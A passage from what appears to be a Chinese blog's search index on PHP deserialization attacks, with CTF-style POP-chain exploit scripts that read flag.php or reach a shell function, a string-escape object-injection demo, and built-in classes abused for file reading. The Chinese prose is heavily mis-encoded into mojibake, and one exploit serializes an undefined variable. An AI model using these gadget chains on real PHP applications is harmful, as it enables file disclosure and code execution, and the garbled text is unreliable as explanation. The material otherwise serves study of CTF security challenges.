å½“ä½¿ç”¨unserializeæ—¶è¢«è°ƒç”¨ï¼Œå¯ç”¨äºåšäº›å¯¹è±¡çš„åˆå§‹åŒ–æ“ä½œ 3.ååºåˆ—åŒ–çš„å¸¸è§èµ·ç‚¹__wakeup ä¸€å®šä¼šè°ƒç”¨ __destruct ä¸€å®šä¼šè°ƒç”¨ __toString å½“ä¸€ä¸ªå¯¹è±¡è¢«ååºåˆ—åŒ–ååˆè¢«å½“åšå­—ç¬¦ä¸²ä½¿ç”¨ 4.ååºåˆ—åŒ–çš„å¸¸è§ä¸­é—´è·³æ¿:__toString å½“ä¸€ä¸ªå¯¹è±¡è¢«å½“åšå­—ç¬¦ä¸²ä½¿ç”¨ __get è¯»å–ä¸å¯è®¿é—®æˆ–ä¸å­˜åœ¨å±æ€§æ—¶è¢«è°ƒç”¨ __set å½“ç»™ä¸å¯è®¿é—®æˆ–ä¸å­˜åœ¨å±æ€§èµ‹å€¼æ—¶è¢«è°ƒç”¨ __isset å¯¹ä¸å¯è®¿é—®æˆ–ä¸å­˜åœ¨çš„å±æ€§è°ƒç”¨isset()æˆ–empty()æ—¶è¢«è°ƒç”¨ å½¢å¦‚ $this-&gt;$func(); 5.ååºåˆ—åŒ–çš„å¸¸è§ç»ˆç‚¹:__call è°ƒç”¨ä¸å¯è®¿é—®æˆ–ä¸å­˜åœ¨çš„æ–¹æ³•æ—¶è¢«è°ƒç”¨ call_user_func ä¸€èˆ¬phpä»£ç æ‰§è¡Œéƒ½ä¼šé€‰æ‹©è¿™é‡Œ call_user_func_array ä¸€èˆ¬phpä»£ç æ‰§è¡Œéƒ½ä¼šé€‰æ‹©è¿™é‡Œ 6.Pharååºåˆ—åŒ–åŸç†ä»¥åŠç‰¹å¾phar://ä¼ªåè®®ä¼šåœ¨å¤šä¸ªå‡½æ•°ä¸­ååºåˆ—åŒ–å…¶metadataéƒ¨åˆ†å—å½±å“çš„å‡½æ•°åŒ…æ‹¬ä¸é™äºå¦‚ä¸‹: copy,file_exists,file_get_contents,file_put_contents,file,fileatime,filectime,filegroup,fileinode,filemtime,fileowner,fileperms,fopen,is_dir,is_executable,is_file,is_link,is_readable,is_writable,is_writeable,parse_ini_file,readfile,stat,unlink,exif_thumbnailexif_imagetype,imageloadfontimagecreatefrom,hash_hmac_filehash_filehash_update_filemd5_filesha1_file,get_meta_tagsget_headers,getimagesizegetimagesizefromstring,extractTo å®æˆ˜&lt;?php//flag is in flag.phperror_reporting(0);class Read { public $var; public function file_get($value) { $text = base64_encode(file_get_contents($value)); return $text; } public function __invoke(){ $content = $this-&gt;file_get($this-&gt;var); echo $content; }}class Show{ public $source; public $str; public function __construct($file='index.php') { $this-&gt;source = $file; echo $this-&gt;source.'Welcome'.&quot;&lt;br&gt;&quot;; } public function __toString() { return $this-&gt;str['str']-&gt;source; } public function _show() { if(preg_match('/gopher|http|ftp|https|dict|\\.\\.|flag|file/i',$this-&gt;source)) { die('hacker'); } else { highlight_file($this-&gt;source); } } public function __wakeup() { if(preg_match(&quot;/gopher|http|file|ftp|https|dict|\\.\\./i&quot;, $this-&gt;source)) { echo &quot;hacker&quot;; $this-&gt;source = &quot;index.php&quot;; } }}class Test{ public $p; public function __construct() { $this-&gt;p = array(); } public function __get($key) { $function = $this-&gt;p; return $function(); }}if(isset($_GET['hello'])){ unserialize($_GET['hello']);}else{ $show = new Show('pop3.php'); $show-&gt;_show();} æ€è·¯ï¼šå¯»æ‰¾ç›®æ ‡å‡½æ•°â€”â€”è¿›è¡Œå›æº¯â€”â€”æ„é€ åˆ©ç”¨é“¾ 1.ååºåˆ—åŒ–å°†ä¼šè§¦å‘wake_upå‡½æ•°ï¼Œè€Œwake_upå‡½æ•°åœ¨showç±»å½“ä¸­2.showç±»ä¸­çš„wake_upå‡½æ•°æ‰§è¡Œæ—¶å°†ä¼šç»è¿‡ä¸€ä¸ªæ­£åˆ™åŒ¹é…ï¼Œè¿™é‡ŒåŒ¹é…çš„æ˜¯sourceè¿™ä¸ªé‡ï¼Œè€Œæ­£åˆ™åŒ¹é…çš„æ—¶å€™sourceæ˜¯è¢«å½“åšå­—ç¬¦ä¸²è¿›è¡ŒåŒ¹é…çš„ï¼Œå‰é¢æœ‰è¯´è¿‡å¦‚æœ__tostringçš„è§¦å‘æ–¹å¼ï¼Œæ‰€ä»¥è¿™é‡Œå¦‚æœæˆ‘ä»¬å°†sourceèµ‹ä¸ºä¸€ä¸ªç±»å¯¹è±¡ï¼Œé‚£ä¹ˆå°±ä¼šè§¦å‘__tostring3.è¿™é‡Œçš„tostringä¼šå»å¯»æ‰¾strè¿™ä¸ªæ•°ç»„ï¼Œå–å‡ºå…¶ä¸­çš„å€¼èµ‹ç»™sourceï¼Œå¦‚æœæ‰¾ä¸åˆ°å°±ä¼šè§¦å‘__getæ–¹æ³•ï¼Œæˆ‘ä»¬å†æ¥çœ‹çœ‹getåœ¨å“ªï¼Œåœ¨testç±»å½“ä¸­4.è¿™é‡Œçš„getæ–¹æ³•ä»–æ˜¯è·å–ä¸€ä¸ªpå¹¶å°†å…¶ä½œä¸ºå‡½æ•°ä½¿ç”¨çš„ï¼Œè¿™é‡Œå°±ä¼šè°ƒç”¨__invokeé­”æœ¯æ–¹æ³•5.è€Œ__invokeé­”æœ¯æ–¹æ³•å­˜åœ¨äºReadç±»ä¸­ï¼Œè¿™é‡Œè°ƒç”¨äº†file_getæ–¹æ³•åè°ƒç”¨äº†file_get_contentè¯»å–æ–‡ä»¶ï¼Œè€Œè¿™é‡Œçš„å‚æ•°æ˜¯æˆ‘ä»¬å¯æ§çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬çš„popåˆ©ç”¨é“¾å¦‚ä¸‹:POPé“¾ï¼šunserializeå‡½æ•°ï¼ˆå˜é‡å¯æ§ï¼‰-&gt;__wakeup()é­”æœ¯æ–¹æ³•-&gt;__tostring()-&gt;__geté­”æœ¯æ–¹æ³•-&gt;__invokeé­”æœ¯æ–¹æ³•-&gt;è§¦å‘readç±»ä¸­çš„file_get_contentså‡½æ•° expç¼–å†™&lt;?phpclass Read{ public $var=&quot;flag.php&quot;;}class Show{ public $source; public $str;}class Test{ public $p;}$r=new Read();$s=new Show();$t=new Test();$t-&gt;p=$r;//èµ‹å€¼Testç±»çš„å¯¹è±¡$tä¸‹çš„å±æ€§pä¸ºReadç±»çš„å¯¹è±¡($r),è§¦å‘__invokeé­”æœ¯æ–¹æ³•$s-&gt;str['str']=$t;//èµ‹å€¼showç±»çš„å¯¹è±¡ï¼ˆ$sï¼‰ä¸‹çš„stræ•°ç»„çš„stré”®çš„å€¼ä¸ºTestç±»çš„å¯¹è±¡$tï¼Œè§¦å‘__geté­”æœ¯æ–¹æ³•ã€‚$s-&gt;source=$s;//ä»¤showç±»ä¸­çš„å¯¹è±¡$sä¸‹çš„sourceå±æ€§è¿›å…¥wake_upå‡½æ•°ï¼Œè¿™æ ·å°±ä¼šè§¦å‘tostringé­”æœ¯æ–¹æ³•echo urlencode((serialize($s))); nepâ€”â€”æ¢¦é‡ŒèŠ±å¼€ç‰¡ä¸¹äº­è·³è½¬æˆ˜åœºï¼Œå›å»æ„é€ ä¸€ä¸‹nepçš„é¢˜ &lt;?phphighlight_file(__FILE__);error_reporting(0);include('shell.php');class Game{ public $username; public $password; public $choice; public $register; public $file; public $filename; public $content; public function __construct() { $this-&gt;username='user'; $this-&gt;password='user'; } public function __wakeup(){ admin if(md5($this-&gt;register)===&quot;21232f297a57a5a743894a0e4a801fc3&quot;){ $this-&gt;choice=new login($this-&gt;file,$this-&gt;filename,$this-&gt;content);//æ–°å»ºä¸€ä¸ªloginç±» }else{ $this-&gt;choice = new register(); } } public function __destruct() { $this-&gt;choice-&gt;checking($this-&gt;username,$this-&gt;password); }}class login{ public $file; public $filename; public $content; public function __construct($file,$filename,$content) { $this-&gt;file=$file; $this-&gt;filename=$filename; $this-&gt;content=$content; } public function checking($username,$password) { if($username==='admin'&amp;&amp;$password==='admin'){ $this-&gt;file-&gt;open($this-&gt;filename,$this-&gt;content); die('login success you can to open shell file!'); } }}class register{ public function checking($username,$password)//è¿™è¾¹å°±ä¼šæ£€æŸ¥äº† { if($username==='admin'&amp;&amp;$password==='admin'){ die('success register admin'); }else{ die('please register admin '); } }}class Open{ function open($filename, $content){ if(!file_get_contents('waf.txt')){ shell($content); }else{ echo file_get_contents($filename.&quot;.php&quot;); } }}if($_GET['a']!==$_GET['b']&amp;&amp;(md5($_GET['a']) === md5($_GET['b'])) &amp;&amp; (sha1($_GET['a'])=== sha1($_GET['b']))){ @unserialize(base64_decode($_POST['unser']));} 1.ååºåˆ—åŒ–è§¦å‘wake_upæ–¹æ³•ï¼Œwake_upæ–¹æ³•ä¸­åšäº†ä¸€ä¸ªåˆ¤æ–­ï¼Œæˆ‘ä»¬è¾“å…¥çš„adminçš„æ—¶å€™å°†ä¼šè·³è½¬åˆ°loginç±»å½“ä¸­2.æ­¤æ—¶å°†ä¼šè°ƒç”¨checkingæ–¹æ³•ï¼Œè¿™é‡Œæœ‰ä¸ªå‚æ•° fileï¼Œæˆ‘ä»¬è¦å¯¹fileèµ‹å€¼è®©è®©ä»–è¿›å…¥Openç±»ä¸­è°ƒç”¨file_get_contentså‡½æ•° EXP&lt;?phpclass Game{ public $username; public $password; public $choice; public $register; public $file; public $filename; public $content;}class login{}class register{}class Open{}$a=new Game;$b=new Open;$a-&gt;register=&quot;admin&quot;;$a-&gt;filename=&quot;shell&quot;;$a-&gt;file=$b;$a-&gt;username=&quot;admin&quot;;$a-&gt;password=&quot;admin&quot;;print(base64_encode(serialize($s)); å°ç»“POPé“¾çš„æ„é€ ï¼Œå…¶å®ä¸€å¼€å§‹æ²¡ä»”ç»†å­¦ä¹ çš„æ—¶å€™æˆ‘ä»¥ä¸ºå¾ˆç®€å•ï¼Œå› ä¸ºæˆ‘æƒ³å½“ç„¶äº†ï¼Œä¹Ÿæ˜¯å› ä¸ºä¸äº†è§£å„ä¸ªé­”æœ¯æ–¹æ³•ï¼Œæ‰€ä»¥ä»¥ä¸ºæ˜¯è‡ªå·±æƒ³å»å“ªä¸ªå‡½æ•°å°±å¯ä»¥å»å“ªä¸ªå‡½æ•°ï¼Œä½†å…¶å®ä¸æ˜¯çš„ï¼Œå…¶ä¸­çš„é€»è¾‘æ€§è¿˜æ˜¯æŒºå¼ºçš„ï¼Œå¯ä»¥å…ˆæ„é€ ä¸€ä¸ªï¼Œç„¶åå†å»æ…¢æ…¢è°ƒè¯•ã€‚ https://xz.aliyun.com/t/8082","link":"/2021/03/25/php-pop%E9%93%BE%E6%9E%84%E9%80%A0/"},{"title":"phpååºåˆ—åŒ–å­—ç¬¦ä¸²é€ƒé€¸","text":"å‰è¨€:ååºåˆ—åŒ–ç¡®å®æœ‰å¾ˆå¤šå†…å®¹éœ€è¦å»å­¦ï¼Œå‰æ®µæ—¶é—´å­¦ä¹ çš„ååºåˆ—åŒ–ç¡®å®ä¸å¤Ÿç”¨ åŸºç¡€çŸ¥è¯†:1.phpåœ¨ååºåˆ—åŒ–æ—¶ï¼Œå¯¹ç±»ä¸­ä¸å­˜åœ¨çš„å±æ€§ä¹Ÿä¼šè¿›è¡Œååºåˆ—åŒ– 12345678&lt;?phpclass test{ public $test=&quot;aaaaa&quot;;}$b=new test();$s='O:4:&quot;test&quot;:2:{s:4:&quot;test&quot;;s:5:&quot;aaaaa&quot;;s:4:&quot;tess&quot;;s:5:&quot;aaaaa&quot;;}';var_dump(unserialize($s)); 2.phpåœ¨ååºåˆ—åŒ–æ—¶ï¼Œåº•å±‚ä»£ç æ˜¯ä»¥ï¼›ä½œä¸ºå­—æ®µçš„åˆ†å‰²ï¼Œä»¥}ä½œä¸ºç»“æœï¼ˆå­—ç¬¦ä¸²é™¤å¤–ï¼‰ï¼Œå¹¶ä¸”æ˜¯æ ¹æ®é•¿åº¦åˆ¤æ–­å†…å®¹çš„3.å¯¹äºç±»ä¼¼è¿™ç§O:1:â€Aâ€:2:{s:1:â€aâ€;s:3:â€123â€;s:1:â€bâ€;s:9:â€xianyu123â€;}s:1:â€câ€;s:2:â€yesâ€;ä¹Ÿæ˜¯èƒ½å¤Ÿæ­£å¸¸ååºåˆ—åŒ–çš„ï¼Œå³ä½¿s:2:â€yesâ€çš„é•¿åº¦ä¸åŒ¹é…ä¹Ÿä¸å½±å“ã€‚è¯´æ˜phpåœ¨ååºåˆ—åŒ–çš„æ—¶å€™åªè¦æ±‚ä¸€ä¸ªååºåˆ—åŒ–å­—ç¬¦ä¸²å—åˆæ³•å³å¯ï¼Œå½“ç„¶å¾—æ˜¯ç¬¬ä¸€ä¸ªå­—ç¬¦ä¸²å—ã€‚ æ¼æ´äº§ç”ŸåŸå› åºåˆ—åŒ–çš„å­—ç¬¦ä¸²åœ¨ç»è¿‡è¿‡æ»¤å‡½æ•°ä¸æ­£ç¡®çš„å¤„ç†è€Œå¯¼è‡´å¯¹è±¡æ³¨å…¥ï¼Œå› ä¸ºå…ˆè¿›è¡Œäº†åºåˆ—åŒ–ï¼Œå†è¿›è¡Œè¿‡æ»¤ï¼Œé‚£ä¹ˆå°±æœ‰å¯èƒ½ä¼šäº§ç”Ÿæ­¤æ¼æ´ã€‚ å®æˆ˜123456789101112131415&lt;?phpfunction filter($f){ $filter = '/c/i'; return preg_replace($filter,'bb',$f);}$username = &quot;admin&quot;;$password = &quot;mypass&quot;;$user = array($username, $password);var_dump(serialize($user));echo &quot;\\n&quot;;$r = filter(serialize($user));var_dump($r);echo &quot;\\n&quot;;var_dump(unserialize($r));?&gt; é¦–å…ˆçœ‹çœ‹åŸæœ¬è¾“å‡ºçš„å†…å®¹: 12345678string(39) &quot;a:2:{i:0;s:5:&quot;admin&quot;;i:1;s:6:&quot;mypass&quot;;}&quot;array(2) { [0] =&gt; string(5) &quot;admin&quot; [1] =&gt; string(6) &quot;mypass&quot;} 1$username = &quot;ggggyu123cccccccccccccccccccc\\&quot;;i:1;s:6:\\&quot;123456\\&quot;;}&quot;; 123456789101112131415string(84) &quot;a:2:{i:0;s:49:&quot;ggggyu123cccccccccccccccccccc&quot;;i:1;s:6:&quot;123456&quot;;}&quot;;i:1;s:6:&quot;mypass&quot;;}&quot;D:\\apache\\www\\ååºåˆ—åŒ–å­—ç¬¦ä¸²é€ƒé€¸.php:12:string(104) &quot;a:2:{i:0;s:49:&quot;ggggyu123bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb&quot;;i:1;s:6:&quot;123456&quot;;}&quot;;i:1;s:6:&quot;mypass&quot;;}&quot;D:\\apache\\www\\ååºåˆ—åŒ–å­—ç¬¦ä¸²é€ƒé€¸.php:14:array(2) { [0] =&gt; string(49) &quot;ggggyu123bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb&quot; [1] =&gt; string(6) &quot;123456&quot;}è¿›ç¨‹å·²ç»“æŸï¼Œé€€å‡ºä»£ç  0 æ­¤æ—¶æˆåŠŸæ›´æ”¹å¯†ç ï¼Œåˆšåˆšç†è§£äº†ä¸€ä¸‹ï¼Œå…¶å®åŸç†å¾ˆç®€å•ï¼Œå…ˆç†è§£ä»¥ä¸‹å‡ ç‚¹:1.å¯¹åº”å‰ä¸€ä¸ªåºåˆ—åŒ–å†…å®¹s:49è¿™é‡Œè¯´ç¬¬ä¸€ä¸ªå˜é‡çš„å€¼æœ‰49ä¸ªå­—ç¬¦é•¿åº¦ï¼Œé‚£ä¹ˆæ¥ä¸‹æ¥å°±ä¼šä¸€ç›´è¯»å–49ä¸ªé•¿åº¦ï¼Œå¦‚æœå°‘äºæˆ–è€…å¤§äºéƒ½ä¼šæŠ¥é”™å¯¼è‡´è¯»å–ä¸äº†2.ç»è¿‡filterï¼Œæˆ‘ä»¬å‘ç°ä¸€ä¸ªcè¢«æ›¿æ¢æˆä¸¤ä¸ªbäº†ï¼Œä½†æ˜¯ä¾æ—§å­—ç¬¦ä¸²é•¿åº¦ä¸º49ä¸ªï¼Œä½†æ˜¯æˆ‘ä»¬åŸæœ¬åœ¨usernameé‡Œé¢çš„å†…å®¹æ˜¯å˜å¤šäº†ï¼Œè¿™æ ·æˆ‘ä»¬åé¢è¾“å…¥çš„i:1;s:6:â€123456â€;}å°±é€ƒé€¸å‡ºæ¥äº†3.æˆ‘ä»¬çŸ¥é“åºåˆ—åŒ–æ˜¯ä»¥è¯»åˆ°}ä¸ºç»ˆæ­¢çš„ï¼Œæ‰€ä»¥æ­¤æ—¶å¯†ç å°±è¢«ä¿®æ”¹ä¸º123456ï¼Œå› ä¸ºåé¢çš„mypassé‚£äº›å·²ç»è¢«èˆå¼ƒæ‰äº†","link":"/2021/04/13/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8/"},{"title":"phpååºåˆ—åŒ–é—®é¢˜","text":"praviteå’ŒProtectedæˆå‘˜çš„åºåˆ—åŒ–privateç±»privateå£°æ˜çš„å­—æ®µä¸ºç§æœ‰å­—æ®µï¼Œåªåœ¨æ‰€å£°æ˜çš„ç±»ä¸­å¯è§ï¼Œåœ¨è¯¥ç±»çš„å­ç±»å’Œè¯¥ç±»çš„å¯¹è±¡å®ä¾‹ä¸­å‡ä¸å¯è§ privateå‹åœ¨åºåˆ—åŒ–çš„æ ¼å¼ä¸º:%00ç±»å%00 protectprotected å£°æ˜çš„å­—æ®µä¸ºä¿æŠ¤å­—æ®µï¼Œåœ¨æ‰€å£°æ˜çš„ç±»å’Œè¯¥ç±»çš„å­ç±»ä¸­å¯è§ï¼Œä½†åœ¨è¯¥ç±»çš„å¯¹è±¡å®ä¾‹ä¸­ä¸å¯è§ã€‚å› æ­¤ä¿æŠ¤å­—æ®µçš„å­—æ®µååœ¨åºåˆ—åŒ–æ—¶ï¼Œå­—æ®µåå‰é¢ä¼šåŠ ä¸Š \\0*\\0 çš„å‰ç¼€ï¼Œæ³¨æ„ï¼Œè¿™é‡Œçš„ \\0 è¡¨ç¤º ASCII ç ä¸º 0çš„å­—ç¬¦ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬ç»è¿‡ urlencode åçœ‹åˆ°çš„ %00 ã€‚ *privateå‹åœ¨åºåˆ—åŒ–çš„æ ¼å¼ä¸º:%00%00** varå’Œpublicvar å’Œ publicå£°æ˜çš„å­—æ®µéƒ½æ˜¯å…¬å…±å­—æ®µï¼Œå› æ­¤å®ƒä»¬çš„å­—æ®µåçš„åºåˆ—åŒ–æ ¼å¼æ˜¯ç›¸åŒçš„ã€‚å…¬å…±å­—æ®µçš„å­—æ®µåæŒ‰ç…§å£°æ˜æ—¶çš„å­—æ®µåè¿›è¡Œåºåˆ—åŒ–ï¼Œä½†åºåˆ—åŒ–åçš„å­—æ®µåä¸­ä¸åŒ…æ‹¬å£°æ˜æ—¶çš„ å˜é‡å‰ç¼€ç¬¦å· $ã€‚ å®ä¾‹:12345678910&lt;?php class test{ public $name=&quot;ghtwf01&quot;; private $age=&quot;18&quot;; protected $sex=&quot;man&quot;; } $a=new test(); $a=serialize($a); print_r($a);?&gt; 1O:4:&quot;test&quot;:3:{s:4:&quot;name&quot;;s:7:&quot;ghtwf01&quot;;s:9:&quot; test age&quot;;s:2:&quot;18&quot;;s:6:&quot; * sex&quot;;s:3:&quot;man&quot;;} ä½†æ˜¯å¤åˆ¶åˆ°URLä¸­å¯èƒ½ä¼šä¸¢å¤±æ‰€ä»¥æ­¤æ—¶éœ€è¦æŒ‰å¦‚ä¸Šè¯´æ˜è¿›è¡Œæ ‡è®° trick1.åœ¨php7.1+å¯¹ç±»å±æ€§çš„æ£€æµ‹ä¸ä¸¥æ ¼ï¼Œæ‰€ä»¥å¯ä»¥ç”¨publicæ¥ç»•è¿‡ phpå†…ç½®ç±»æ•´ç†è¿‘æœŸé‡åˆ°è®¸å¤šå…³äºPHPå†…ç½®ç±»çš„é¢˜ç›®ï¼Œæ•…åœ¨æ­¤æ•´ç†ä¸€ä¸‹: 12345678910111213141516171819202122&lt;?php$classes = get_declared_classes();foreach ($classes as $class) { $methods = get_class_methods($class); foreach ($methods as $method) { if (in_array($method, array( '__destruct', '__toString', '__wakeup', '__call', '__callStatic', '__get', '__set', '__isset', '__unset', '__invoke', '__set_state' ))) { print $class . '::' . $method . &quot;\\n&quot;; } }} ä½¿ç”¨æ­¤ä»£ç  å¯ä»¥è·å–å¤§éƒ¨åˆ†çš„å†…ç½®ç±»:è¿™é‡Œå°±å…ˆè¯´ä¸€ä¸‹åˆ°ç›®å‰ä¸ºæ­¢é‡åˆ°è¿‡çš„: 123$a=new ZipArchive();$a-&gt;filename=&quot;xxxx.xxx&quot;;$a-&gt;content=ZipArchive::OVERWRITE; ç±» æè¿° DirectoryIterator éå†ç›®å½• FilesystemIterator éå†ç›®å½• GlobIterator éå†ç›®å½•ï¼Œä½†æ˜¯ä¸åŒçš„ç‚¹åœ¨äºå®ƒå¯ä»¥é€šé…ä¾‹å¦‚/var/html/www/flag* SplFileObject è¯»å–æ–‡ä»¶ï¼ŒæŒ‰è¡Œè¯»å–ï¼Œå¤šè¡Œéœ€è¦éå† finfo/finfo_open() éœ€è¦ä¸¤ä¸ªå‚æ•° ZipArchive() ä»»æ„æ–‡ä»¶åˆ é™¤ å®ä¾‹:123$a=new ZipArchive();$a-&gt;filename=&quot;xxxx.xxx&quot;;$a-&gt;content=ZipArchive::OVERWRITE; 12345678&lt;?phpclass A{ public $class='FilesystemIterator'; public $para=&quot;/var/www/html&quot;; public $check; }$o = new A();echo serialize($o); 123456789&lt;?phpclass A{ public $class='SplFileObject'; public $para=&quot;/var/www/html/aMaz1ng_y0u_c0Uld_f1nd_F1Ag_hErE/flag.php&quot;; public $check; }$o = new A();echo serialize($o);","link":"/2021/03/28/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%97%AE%E9%A2%98/"},{"title":"phpè¿ç®—ç¬¦ å­—ç¬¦ä¸²","text":"PHPç±»å‹æ¯”è¾ƒPHPå˜é‡çš„æ¯”è¾ƒä¸»è¦åˆ†ä¸ºä¸¤ç§ï¼Œå°±æ˜¯æ¾æ•£æ¯”è¾ƒï¼šä½¿ç”¨ä¸¤ä¸ªç­‰å·ï¼ˆ==ï¼‰æ¯”è¾ƒï¼Œåªæ¯”è¾ƒå€¼ï¼Œä¸æ¯”è¾ƒç±»å‹ä¸¥æ ¼æ¯”è¾ƒï¼šç”¨ä¸‰ä¸ªç­‰å·ï¼ˆ===ï¼‰æ¯”è¾ƒï¼Œéƒ½æ¯”è¾ƒ ä¸¾ä¸ªä¾‹å­ 123456789101112131415&lt;?phpif(42 == &quot;42&quot;) { echo '1ã€å€¼ç›¸ç­‰';}echo PHP_EOL; // æ¢è¡Œç¬¦if(42 === &quot;42&quot;) { echo '2ã€ç±»å‹ç›¸ç­‰';} else { echo '3ã€ä¸ç›¸ç­‰';}?&gt;è¾“å‡ºçš„ç»“æœåˆ†åˆ«æ˜¯ å€¼ç›¸ç­‰ å€¼ä¸ç›¸ç­‰ æ¥ä¸‹æ˜¯PHPçš„å¸¸é‡è®¾ç½®å¸¸é‡éœ€è¦ä½¿ç”¨defineï¼ˆï¼‰å‡½æ•° ä½¿ç”¨æ–¹æ³•å¦‚ä¸‹ 1define(&quot;å¸¸é‡çš„åç§°&quot;,&quot;å¸¸é‡çš„å€¼&quot;,(å¯å®šä¹‰ä¸ºtrueä¹Ÿå¯ä¸å†™)); 12345&lt;?phpdefine(&quot;hwg&quot;,&quot;wgæ˜¯å¸…å“¥&quot;);echo hwg;//è¾“å‡ºæ˜¯wgæ˜¯å¸…å“¥echo HWG;//æ— æ³•è¾“å‡ºï¼Œå› ä¸ºå¤§å†™æœªè¢«å®šä¹‰?&gt; è¯´æ˜1.ç¬¬ä¸€ä¸ªâ€â€æ˜¯name:å¿…é€‰å‚æ•°ï¼Œå¸¸é‡åç§°ï¼Œå³æ ‡å¿—ç¬¦â€™2.ç¬¬äºŒä¸ªâ€â€æ˜¯valueï¼šå¿…é€‰å‚æ•°ï¼Œå¸¸é‡çš„å€¼ã€‚3æœ€åä¸€ä¸ªäº¤case_insensitive,å¯é€‰å‚æ•°ï¼Œå¦‚æœè®¾ç½®ä¸ºTRUEï¼Œè¯¥å¸¸é‡åˆ™å¤§å°å†™ä¸æ•æ„Ÿï¼Œé»˜è®¤æ˜¯å¤§å°å†™æ•æ„Ÿçš„ã€‚ (å¸¸é‡åä¸éœ€è¦åŠ  $ ä¿®é¥°ç¬¦)ã€‚ ä¸¾ä¸ªä¾‹å­ 12345&lt;?phpdefine(&quot;hwg&quot;,&quot;wgæ˜¯å¸…å“¥&quot;,true);echo hwg;//è¾“å‡ºæ˜¯wgæ˜¯å¸…å“¥echo HWG;//è¾“å‡ºwgæ˜¯å¸…å“¥?&gt; æœ€åä¸€ç‚¹æ˜¯ï¼Œå¸¸é‡æ˜¯å…¨å±€çš„ï¼Œå®šä¹‰å®Œè¯¥å¸¸é‡ä¹‹ååªè¦è¾“å‡ºè¯¥å¸¸é‡ï¼Œå‡ºæ¥çš„å®šä¹‰ä»¥åçš„å€¼ã€‚ PHPå­—ç¬¦ä¸²å¸¸é‡ä¾‹ 1234&lt;?php$txt=&quot;Hello world!&quot;;echo $txt;?&gt; phpå¹¶ç½®è¿ç®—ç¬¦123456&lt;?php$txt1=&quot;Hello world!&quot;;$txt2=&quot;What a nice day!&quot;;echo $txt1 . &quot; &quot; . $txt2;?&gt;//è¾“å‡ºHello world! What a nice day! PHP strlen()å‡½æ•°ç”¨çŸ¥é“å­—ç¬¦ä¸²çš„é•¿åº¦ 123&lt;?phpecho strlen(&quot;Hello world!&quot;);?&gt; PHP strpos() å‡½æ•°å®šä¹‰å’Œç”¨æ³•strpos() å‡½æ•°æŸ¥æ‰¾å­—ç¬¦ä¸²åœ¨å¦ä¸€å­—ç¬¦ä¸²ä¸­ç¬¬ä¸€æ¬¡å‡ºç°çš„ä½ç½®ã€‚ æ³¨é‡Šï¼šstrpos() å‡½æ•°å¯¹å¤§å°å†™æ•æ„Ÿã€‚è‹¥æ²¡æœ‰æ‰¾åˆ°ï¼Œåˆ™è¿”å›strposæœ‰ä¸¤ç§ç±»å‹çš„è¿”å›å€¼ï¼Œä¸€ç§æ˜¯æ•´å‹ï¼Œä¸€ç§æ˜¯boolå‹ã€‚ æ³¨é‡Šï¼šè¯¥å‡½æ•°æ˜¯äºŒè¿›åˆ¶å®‰å…¨çš„ã€‚ä¾‹å­ 123&lt;?phpecho strops(&quot;you are hansom&quot;,&quot;are&quot;);?&gt; è¾“å‡ºç»“æœæ˜¯4ï¼ˆè®¡ç®—æ–¹æ³•å¦‚ä¸‹ï¼šä»ç¬¬ä¸€ä¸ªyä¸º0å¼€å§‹ç®—èµ·ï¼Œç©ºæ ¼ä¹Ÿç®—ä¸€ä¸ªï¼Œæ‰€ä»¥åˆ°aä¹‹å‰ä¸€å…±æœ‰4ä¸ªå­—èŠ‚ï¼‰ ç›¸å…³å‡½æ•°ï¼š stripos() - æŸ¥æ‰¾å­—ç¬¦ä¸²åœ¨å¦ä¸€å­—ç¬¦ä¸²ä¸­ç¬¬ä¸€æ¬¡å‡ºç°çš„ä½ç½®ï¼ˆä¸åŒºåˆ†å¤§å°å†™ï¼‰ strripos() - æŸ¥æ‰¾å­—ç¬¦ä¸²åœ¨å¦ä¸€å­—ç¬¦ä¸²ä¸­æœ€åä¸€æ¬¡å‡ºç°çš„ä½ç½®ï¼ˆä¸åŒºåˆ†å¤§å°å†™ï¼‰ strrpos() - æŸ¥æ‰¾å­—ç¬¦ä¸²åœ¨å¦ä¸€å­—ç¬¦ä¸²ä¸­æœ€åä¸€æ¬¡å‡ºç°çš„ä½ç½®ï¼ˆåŒºåˆ†å¤§å°å†™ï¼‰ å‚è€ƒé“¾æ¥https://www.w3school.com.cn/php/func_string_strpos.asp PHPè¿ç®—ç¬¦åŸºæœ¬å’ŒCä¸­çš„å·®ä¸å¤šï¼Œæˆ‘å°±æ•´ç†ä¸€ä¸‹å’ŒCä¸ä¸€æ ·çš„å§ç¬¬ä¸€ä¸ªæ˜¯intdivï¼ˆï¼‰å‡½æ•°ï¼šè¯¥å‡½æ•°è¿”å›å€¼ä¸ºç¬¬ä¸€ä¸ªå‚æ•°é™¤äºç¬¬äºŒä¸ªå‚æ•°çš„å€¼å¹¶å–ç­‰ï¼ˆå‘ä¸‹å–ç­‰ï¼‰ä¾‹ï¼š 123&lt;?php var_dump(intdiv(10, 3)); ?&gt; è¾“å‡ºçš„å€¼æ˜¯intï¼ˆ3ï¼‰æœ‰ä¸€äº›è¿ç®—ç¬¦ä¸å¤ªä¸€æ ·æ¯”å¦‚ä¸ç­‰äºçš„è¡¨ç¤ºæ–¹æ³•æœ‰&lt;&gt;å’Œ!=ç»å¯¹ç­‰äºæœ‰=== é€»è¾‘è¿ç®—ç¬¦ï¼š![X~KPJ$LXMK`4BK1HHQL4RP5](https://raw.githubusercontent.com/Hwwg/myphoto/master/X%7EKPJ%24LXMK%604BK1HHQL4RP5.png) å‚è€ƒhttps://www.runoob.com/php/php-operators.html PHPä¸‰å…ƒè¿ç®—ç¬¦è¿™ä¸ªå’Œif elseè¯­å¥æœ‰ç‚¹åƒï¼Œæˆ‘å…ˆèŠèŠä¸‰å…ƒè¿ç®—ç¬¦ä¸‰å…ƒè¿ç®—ç¬¦çš„æ ¼å¼(expr1) ? (expr2) : (expr3)è§£é‡Šï¼šå¦‚æœæ¡ä»¶â€expr1â€æˆç«‹ï¼Œåˆ™æ‰§è¡Œè¯­å¥â€expr2â€,å¦åˆ™æ‰§è¡Œâ€expr3â€ ä¸¾ä¸ªä¾‹å­ 1234&lt;?php$b = 